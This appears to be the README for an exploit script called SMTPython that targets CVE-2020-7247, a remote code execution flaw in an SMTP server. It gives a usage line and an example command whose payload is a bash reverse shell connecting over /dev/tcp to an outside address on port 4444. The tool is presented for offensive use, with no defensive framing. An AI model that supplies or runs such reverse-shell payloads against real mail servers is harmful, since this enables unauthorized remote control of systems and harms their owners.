# SMTPython

smtp exploit script

CVE-2020-7247

RemoteCodeExecution


usage:

./SMTPython.py <RemoteHOST> <PORT> <Command> <name@host>
  
example:


./SMTPython.py 192.168.0.4 25 'bash -c "exec bash -i &> /dev/tcp/192.168.1.104 4444 <&1"' user@ubuntu

